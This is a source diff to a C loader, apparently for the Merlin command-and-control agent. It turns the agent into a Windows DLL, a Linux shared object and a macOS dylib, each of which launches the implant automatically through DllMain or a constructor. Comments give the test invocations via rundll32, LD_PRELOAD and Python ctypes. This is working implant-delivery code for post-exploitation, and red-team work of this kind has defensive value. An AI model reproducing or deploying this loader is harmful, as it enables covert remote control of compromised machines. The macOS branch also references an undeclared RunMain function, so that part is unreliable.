@@ -1,6 +1,12 @@
+#ifdef __WIN32
+
+// Test DLL execution
+// rundll32 merlin.dll,Magic
+
 #include <windows.h>
 #include <stdio.h>
-#include "main.h"
+
+void Run();
 
 // https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-library-entry-point-function
 
@@ -35,11 +41,48 @@ BOOL WINAPI DllMain(
     return TRUE;  // Successful DLL_PROCESS_ATTACH.
 }
 
-// Magic is the exported function name that can be called from sRDI to launch a Merlin agent
-// There must be a call to an exported function from main.go so that the export functions are available
-// Any exported function from main.go can be called directly without the need to include it here
-int Magic(char *url){
-    // Run Merlin Agent
-    Merlin(url);
-    return 0;
+#elif __linux__
+
+// Test SO execution
+// LD_PRELOAD=/home/rastley/Downloads/merlin.so /usr/bin/whoami
+
+void Magic();
+
+static void __attribute__ ((constructor)) init(void);
+
+static void init(void) {
+  // Magic is the exported function from shared.go
+  Magic();
+  return;
 }
+
+#elif __APPLE__
+
+// Test Dylib execution with python3
+// python3
+// import ctypes
+// ctypes.CDLL("./melrin.dylib")
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <wchar.h>
+#include <assert.h>
+#include <pthread.h>
+
+void Magic();
+
+__attribute__ ((constructor)) void initializer()
+{
+	pthread_attr_t  attr;
+    pthread_t       posixThreadID;
+    int             returnVal;
+
+    returnVal = pthread_attr_init(&attr);
+    assert(!returnVal);
+    returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+    assert(!returnVal);
+    pthread_create(&posixThreadID, &attr, &RunMain, NULL);
+}
+
+#endif
